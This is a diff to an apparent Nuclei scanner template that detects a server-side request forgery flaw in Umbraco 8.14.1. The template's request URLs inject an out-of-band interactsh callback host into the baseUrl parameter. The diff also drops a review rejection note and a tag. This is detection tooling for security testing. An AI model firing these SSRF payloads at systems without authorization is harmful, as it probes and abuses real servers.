@@ -15,6 +15,7 @@ http:
   - '{{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}'
   - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/'
   - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/'
+  req-condition: true
   stop-at-first-match: true
 id: umbraco-base-ssrf
 info:
@@ -27,11 +28,10 @@ info:
     programs to perform a server-side request forgery (SSRF) attack.
   metadata:
     max-request: 3
-    runzero-review: REJECT/2025-11-07/uses interactsh
     shodan-query: http.html:"Umbraco"
     verified: true
   name: Umbraco 8.14.1 - baseUrl Server-Side Request Forgery (SSRF)
   reference:
   - https://www.exploit-db.com/exploits/50462
   severity: medium
-  tags: oast,edb,ssrf,umbraco,vuln
+  tags: oast,edb,ssrf,umbraco
